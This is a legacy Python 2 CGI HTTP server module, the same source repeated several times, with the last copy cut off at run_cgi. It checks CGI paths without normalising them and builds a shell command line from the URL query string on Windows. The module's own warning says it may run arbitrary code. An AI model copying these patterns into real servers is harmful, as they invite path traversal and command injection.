"""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
"""


__version__ = "0.4"

__all__ = ["CGIHTTPRequestHandler"]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """Serve a POST request.

        This is only implemented for CGI scripts.

        """

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, "Can only POST to CGI scripts")

    def send_head(self):
        """Version of send_head that support CGI scripts"""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """Test whether self.path corresponds to a CGI script,                    
        and return a boolean.                    

        This function sets self.cgi_info to a tuple (dir, rest)                    
        when it returns True, where dir is the directory part before                    
        the CGI script name.  Note that rest begins with a                    
        slash if it is not empty.                    

        The default implementation tests whether the path                    
        begins with one of the strings in the list                    
        self.cgi_directories (and the next character is a '/'                    
        or the end of the string).                    
        """

        path = self.path                    

        for x in self.cgi_directories:                    
            i = len(x)                    
            if path[:i] == x and (not path[i:] or path[i] == '/'):                    
                self.cgi_info = path[:i], path[i+1:]                    
                return True                    
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """Test whether argument path is an executable file."""
        return executable(path)

    def is_python(self, path):
        """Test whether argument path is a Python script."""
        head, tail = os.path.splitext(path)
        return tail.lower() in (".py", ".pyw")

    def run_cgi(self):
        """Execute a CGI script."""
        path = self.path                    
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, "No such CGI script (%r)" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, "CGI script is not a plain file (%r)" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, "CGI script is not a Python script (%r)" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, "CGI script is not executable (%r)" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader("authorization")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == "basic":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in "\t\n\r ":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, "")
        os.environ.update(env)

        self.send_response(200, "Script output follows")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error("CGI script exit status %#x", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith("w.exe"):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = "%s -u %s" % (interp, cmdline)
            if '=' not in query and '"' not in query:
                cmdline = '%s "%s"' % (cmdline, query)
            self.log_message("command: %s", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == "post" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error("CGI script exit status %#x", sts)
            else:
                self.log_message("CGI script exited OK")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {"__name__": "__main__"})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error("CGI script exit status %s", str(sts))
            else:
                self.log_message("CGI script exited OK")


nobody = None

def nobody_uid():
    """Internal routine to get nobody's uid"""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """Test for executable file."""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()

"""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
"""


__version__ = "0.4"

__all__ = ["CGIHTTPRequestHandler"]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """Serve a POST request.

        This is only implemented for CGI scripts.

        """

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, "Can only POST to CGI scripts")

    def send_head(self):
        """Version of send_head that support CGI scripts"""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """Test whether self.path corresponds to a CGI script,                    
        and return a boolean.                    

        This function sets self.cgi_info to a tuple (dir, rest)                    
        when it returns True, where dir is the directory part before                    
        the CGI script name.  Note that rest begins with a                    
        slash if it is not empty.                    

        The default implementation tests whether the path                    
        begins with one of the strings in the list                    
        self.cgi_directories (and the next character is a '/'                    
        or the end of the string).                    
        """

        path = self.path                    

        for x in self.cgi_directories:                    
            i = len(x)                    
            if path[:i] == x and (not path[i:] or path[i] == '/'):                    
                self.cgi_info = path[:i], path[i+1:]                    
                return True                    
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """Test whether argument path is an executable file."""
        return executable(path)

    def is_python(self, path):
        """Test whether argument path is a Python script."""
        head, tail = os.path.splitext(path)
        return tail.lower() in (".py", ".pyw")

    def run_cgi(self):
        """Execute a CGI script."""
        path = self.path                    
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, "No such CGI script (%r)" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, "CGI script is not a plain file (%r)" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, "CGI script is not a Python script (%r)" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, "CGI script is not executable (%r)" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader("authorization")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == "basic":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in "\t\n\r ":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, "")
        os.environ.update(env)

        self.send_response(200, "Script output follows")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error("CGI script exit status %#x", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith("w.exe"):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = "%s -u %s" % (interp, cmdline)
            if '=' not in query and '"' not in query:
                cmdline = '%s "%s"' % (cmdline, query)
            self.log_message("command: %s", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == "post" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error("CGI script exit status %#x", sts)
            else:
                self.log_message("CGI script exited OK")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {"__name__": "__main__"})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error("CGI script exit status %s", str(sts))
            else:
                self.log_message("CGI script exited OK")


nobody = None

def nobody_uid():
    """Internal routine to get nobody's uid"""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """Test for executable file."""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()

"""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
"""


__version__ = "0.4"

__all__ = ["CGIHTTPRequestHandler"]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """Serve a POST request.

        This is only implemented for CGI scripts.

        """

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, "Can only POST to CGI scripts")

    def send_head(self):
        """Version of send_head that support CGI scripts"""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """Test whether self.path corresponds to a CGI script,                    
        and return a boolean.                    

        This function sets self.cgi_info to a tuple (dir, rest)                    
        when it returns True, where dir is the directory part before                    
        the CGI script name.  Note that rest begins with a                    
        slash if it is not empty.                    

        The default implementation tests whether the path                    
        begins with one of the strings in the list                    
        self.cgi_directories (and the next character is a '/'                    
        or the end of the string).                    
        """

        path = self.path                    

        for x in self.cgi_directories:                    
            i = len(x)                    
            if path[:i] == x and (not path[i:] or path[i] == '/'):                    
                self.cgi_info = path[:i], path[i+1:]                    
                return True                    
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """Test whether argument path is an executable file."""
        return executable(path)

    def is_python(self, path):
        """Test whether argument path is a Python script."""
        head, tail = os.path.splitext(path)
        return tail.lower() in (".py", ".pyw")

    def run_cgi(self):
        """Execute a CGI script."""
        path = self.path                    
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, "No such CGI script (%r)" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, "CGI script is not a plain file (%r)" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, "CGI script is not a Python script (%r)" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, "CGI script is not executable (%r)" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader("authorization")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == "basic":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in "\t\n\r ":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, "")
        os.environ.update(env)

        self.send_response(200, "Script output follows")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error("CGI script exit status %#x", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith("w.exe"):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = "%s -u %s" % (interp, cmdline)
            if '=' not in query and '"' not in query:
                cmdline = '%s "%s"' % (cmdline, query)
            self.log_message("command: %s", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == "post" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error("CGI script exit status %#x", sts)
            else:
                self.log_message("CGI script exited OK")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {"__name__": "__main__"})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error("CGI script exit status %s", str(sts))
            else:
                self.log_message("CGI script exited OK")


nobody = None

def nobody_uid():
    """Internal routine to get nobody's uid"""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """Test for executable file."""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()

"""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
"""


__version__ = "0.4"

__all__ = ["CGIHTTPRequestHandler"]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """Serve a POST request.

        This is only implemented for CGI scripts.

        """

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, "Can only POST to CGI scripts")

    def send_head(self):
        """Version of send_head that support CGI scripts"""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """Test whether self.path corresponds to a CGI script,                    
        and return a boolean.                    

        This function sets self.cgi_info to a tuple (dir, rest)                    
        when it returns True, where dir is the directory part before                    
        the CGI script name.  Note that rest begins with a                    
        slash if it is not empty.                    

        The default implementation tests whether the path                    
        begins with one of the strings in the list                    
        self.cgi_directories (and the next character is a '/'                    
        or the end of the string).                    
        """

        path = self.path                    

        for x in self.cgi_directories:                    
            i = len(x)                    
            if path[:i] == x and (not path[i:] or path[i] == '/'):                    
                self.cgi_info = path[:i], path[i+1:]                    
                return True                    
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """Test whether argument path is an executable file."""
        return executable(path)

    def is_python(self, path):
        """Test whether argument path is a Python script."""
        head, tail = os.path.splitext(path)
        return tail.lower() in (".py", ".pyw")

    def run_cgi(self):
